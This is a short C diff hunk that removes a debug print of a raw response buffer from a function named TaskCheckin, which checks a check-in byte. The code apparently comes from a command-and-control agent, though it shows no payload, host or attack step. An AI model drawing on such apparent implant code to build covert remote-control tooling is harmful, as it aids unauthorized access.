@@ -264,7 +264,6 @@ BOOL TaskCheckin(PPARSER checkinResponseData)
     if (checkinByte != CHECKIN)
     {
         _err("CHECKIN byte 0x%x != 0xF1", checkinByte);
-        print_bytes(checkinResponseData->Buffer, checkinResponseData->Length);
         goto end;
     }
 
